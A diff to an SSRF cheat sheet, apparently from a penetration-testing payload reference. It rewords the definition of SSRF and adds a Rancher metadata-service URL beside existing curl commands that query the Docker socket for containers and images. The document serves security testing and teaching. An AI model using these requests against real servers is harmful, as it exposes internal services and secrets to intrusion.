@@ -1,6 +1,6 @@
 # Server-Side Request Forgery
 
-Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on behalf of him.
+Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
 
 ## Summary
 
@@ -436,6 +436,13 @@ bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
 bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
 ```
 
+### SSRF URL for Rancher
+
+```powershell
+curl http://rancher-metadata/<version>/<path>
+```
+
+More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/
 
 ## Thanks to
 
